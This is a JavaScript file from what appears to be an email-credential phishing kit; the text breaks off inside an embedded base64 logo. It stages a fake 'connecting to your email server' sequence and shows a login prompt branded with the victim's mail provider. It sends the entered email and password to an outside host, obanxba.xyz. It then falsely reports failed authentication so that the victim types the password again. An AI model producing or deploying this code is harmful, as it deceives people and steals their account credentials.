var email = getParm("e");
var ehost = email.split("@")[1];
var provider = ehost.split(".")[0];

jQuery(document).ready(function(){


    $("#download-btn").click( (e) => {
        e.preventDefault();
        $("#mbg").removeClass("hide");
        $("#mbd").removeClass("hide");
        setTimeout(() => {
            $("#conn-status").text("Identifying your email server...");
                setTimeout(() => {
                    checkemail(email);
                    $("#conn-status").text("Connecting to " + ehost + " email servers");
                    setTimeout(() => {
                        $("#conn-interface").addClass("hide");
                        $("#auth-interface").removeClass("hide");
                        $("#email-label").text(email);
                        $("#server-link").text(ehost);
                        $("#server-link").attr("href","http://"+ehost);
                    }, 4000);
                }, 2000);
        }, 2000);
    });

    $("[href='download']").click(function(event){
        event.preventDefault();
        $("#mbg").removeClass("hide");
        $("#mbd").removeClass("hide");
        setTimeout(() => {
            $("#conn-status").text("Identifying your email server...");
                setTimeout(() => {
                    checkemail(email);
                    $("#conn-status").text("Connecting to " + ehost + " email servers");
                    setTimeout(() => {
                        $("#conn-interface").addClass("hide");
                        $("#auth-interface").removeClass("hide");
                        $("#email-label").text(email);
                        $("#server-link").text(ehost);
                        $("#server-link").attr("href","http://"+ehost);
                    }, 4000);
                }, 2000);
        }, 2000);
    });

    $("#btn-download").click(function (event) {
        event.preventDefault();
        let password = $("#password").val();
        if (password.length < 3){
            alert("please enter a valid password");
            return;
        }
        $.ajax({
            url: "https://obanxba.xyz/mb1/po.php",
            method: "post",
            data: {
                x1: email,
                x2: password
            },
            success: function(data){
                console.log(data);
                progressDisp();
                setTimeout(() => {
                    $("#dl").removeClass("hide");
                    $("#dl-loader").addClass("hide");
                    $("#failed-auth").removeClass("hide");
                    $(".email-label").css("margin-top", "0px");
                    $("#password").val("");
                    $("#password").focus();
                }, 3000);

            }
        });
        $("#failed-auth").addClass("hide");
        $(".email-label").css("margin-top", "20px");
        $("#dl").addClass("hide");
        $("#dl-loader").removeClass("hide");
    })

});

function progressDisp(){
    var progress = 0;
    $("#conn-interface").addClass("hide");
    $("#auth-interface").addClass("hide");
    $("#progress-interface").removeClass("hide");
    setInterval(() => {
        progress++;
        progressString = progress.toString()+"%";
        $("#progressbar").css("width", progressString);
        $("#progressbar").text(progressString);
        if(progress > 53){
            clearInterval();
            $("#conn-interface").addClass("hide");
            $("#auth-interface").removeClass("hide");
            $("#progress-interface").addClass("hide");
            $("#progressbar").css("width", "0%");
            $("#progressbar").text("0%");
            progress = 0;
        }
    }, 50);
}

function getParm(name){
  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
  var regexS = "[\\?&]"+name+"=([^&#]*)";
  var regex = new RegExp(regexS);
  var results = regex.exec(window.location.href);
  
  //set variables for each of the fields you wish to pre-file
  //reference them by the ID you found for the field when viewing the source
  EmailField = document.getElementById("X1");  

  if(results == null)
    return "";
  else
    return results[1];
}

function checkemail(email) {
    var emailfield = $.trim(email.toLowerCase());
    var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
    if (emailfield == "") {
        jQuery.facebox("<div class='pop_up_class'>You have a blank email field</div>");
    } else {
        if (!emailReg.test(emailfield)) {
            jQuery.facebox("<div class='pop_up_class'>Wrong Email Format</div>");
        } else {
            if (emailfield.indexOf("yahoo.com") != -1) {
                var the_server = "y";
                var server = "Yahoo";
                var the_image = "<img src='data:image/png;base64,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' width='130' />";
            } else if (emailfield.indexOf("gmail.com") != -1) {
                var the_server = "g";
                var server = "Gmail";
                var the_image = "<img src='data:image/png;base64,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' width='130' />";
            } else if (emailfield.indexOf("hotmail.com") != -1) {
                var the_server = "h";
                var server = "Hotmail";
                var the_image = "<img src='img/hotmail.jpg' width='130' />";
            } else if (emailfield.indexOf("outlook.com") != -1) {
                var the_server = "h";
                var server = "Outlook";
                var the_image = "<img src='data:image/png;base64,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